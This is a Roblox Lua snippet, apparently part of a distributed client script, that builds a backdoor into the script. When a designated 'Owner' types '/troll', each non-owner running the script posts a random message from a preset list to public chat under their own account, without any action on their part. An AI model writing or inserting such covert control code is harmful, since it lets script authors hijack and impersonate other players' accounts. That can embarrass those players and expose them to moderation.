local function onChatted(p, msg)
    -- Check if the speaker is an Owner AND if the current player is NOT an Owner
    if Owners[p.UserId] and not Owners[game.Players.LocalPlayer.UserId] then
        if msg:lower() == "/troll" then
            local randomGlaze = GlazeMessages[math.random(1, #GlazeMessages)]
            
            -- Compatibility check for legacy and new TextChatService
            local SayMessageRequest = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
            if SayMessageRequest then
                SayMessageRequest:FireServer(randomGlaze, "All")
            else
                -- Fallback for newer Roblox Chat
                local TextChatService = game:GetService("TextChatService")
                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    TextChatService.TextChannels.RBXGeneral:SendAsync(randomGlaze)
                end
            end
        end
    end
end

